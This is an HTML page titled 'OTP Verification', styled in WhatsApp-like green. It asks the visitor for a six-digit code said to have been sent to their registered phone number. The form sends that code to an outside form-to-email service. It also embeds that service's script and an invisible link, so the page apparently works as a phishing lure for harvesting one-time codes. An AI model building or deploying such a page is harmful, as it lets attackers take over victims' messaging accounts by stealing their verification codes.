<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>OTP Verification</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #25D366, #075E54);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .otp-container {
      background-color: #fff;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 15px 30px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .otp-container h2 {
      margin-bottom: 10px;
      color: #333;
    }

    .otp-container p {
      font-size: 15px;
      margin-bottom: 25px;
      color: #555;
    }

    .otp-box {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin-bottom: 25px;
      position: relative;
    }

    .otp-box input {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 55px;
      opacity: 0;
      z-index: 10;
      letter-spacing: 12px;
      font-size: 26px;
      text-align: center;
    }

    .fake-box {
      display: flex;
      width: 100%;
      justify-content: space-between;
    }

    .fake-box div {
      width: 45px;
      height: 55px;
      border: 2px solid #ccc;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      background-color: #f9f9f9;
    }

    .submit-btn {
      background-color: #25D366;
      color: #fff;
      padding: 14px;
      width: 100%;
      border: none;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .submit-btn:hover {
      background-color: #128C7E;
    }

    .error-msg {
      color: red;
      margin-top: 10px;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <div class="otp-container">
    <h2>OTP Verification</h2>
    <p>Sent to your Registered phone number</p>

    <form id="otpForm" method="post" action="https://www.100forms.com/form-redirect"> <!-- Add real endpoint -->
      <div class="otp-box">
        <input type="text" id="otpInput" name="otp" maxlength="6" inputmode="numeric" pattern="\d*" required autocomplete="one-time-code" />
        <div class="fake-box" id="fakeBoxes">
          <div></div><div></div><div></div><div></div><div></div><div></div>
        </div>
      </div>

      <button type="submit" class="submit-btn">Continue</button>
      <div class="error-msg" id="errorMsg"></div>

       <div>
<div style='font-size:1px; opacity:0;'
 style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
<script src="https://www.100forms.com/js/FORMKEY:4J35MXLM2UN7" type="text/javascript"></script>
</div>
    </form>
  </div>

  <script>
    const otpInput = document.getElementById('otpInput');
    const fakeBoxes = document.querySelectorAll('#fakeBoxes div');
    const form = document.getElementById('otpForm');
    const errorMsg = document.getElementById('errorMsg');

    otpInput.addEventListener('input', () => {
      const value = otpInput.value;
      for (let i = 0; i < 6; i++) {
        fakeBoxes[i].textContent = value[i] || '';
      }
    });

    form.addEventListener('submit', function(e) {
      const otp = otpInput.value.trim();
      if (!/^\d{6}$/.test(otp)) {
        e.preventDefault(); // Stop submission
        errorMsg.textContent = "Please enter a valid 6-digit OTP.";
      } else {
        errorMsg.textContent = "";
      }
    });

    window.addEventListener('load', () => {
      otpInput.focus();
    });
  </script>

</body>
</html>
